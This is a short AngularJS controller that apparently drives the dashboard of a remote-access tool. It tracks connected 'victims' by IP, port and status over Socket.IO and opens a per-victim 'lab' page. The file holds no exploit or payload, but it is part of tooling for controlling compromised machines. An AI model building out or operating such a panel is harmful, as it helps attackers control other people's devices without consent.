angular.module('myapp', []).controller('AppCtrl', function ($scope) {
    var socket = io();

    $scope.victims = [];

    // Listen for new victim
    socket.on('SocketIO:NewVictim', function (index) {
        socket.emit('getVictimData', index);
    });

    // Listen for victim data and update the list
    socket.on('victimData', function (data) {
        $scope.$apply(function () {
            var existingVictim = $scope.victims.find(v => v.id === data.id);
            if (existingVictim) {
                existingVictim.ip = data.ip;
                existingVictim.port = data.port;
                existingVictim.status = data.status;
            } else {
                $scope.victims.push(data);
            }
        });
    });

    // Remove victim on disconnect
    socket.on('SocketIO:RemoveVictim', function (index) {
        $scope.$apply(function () {
            $scope.victims = $scope.victims.filter(v => v.id !== index);
        });
    });

    // Navigate to lab.html with Victim ID as query parameter
    $scope.openLab = function (index) {
        window.location.href = "lab.html?id=" + index;
    };
});
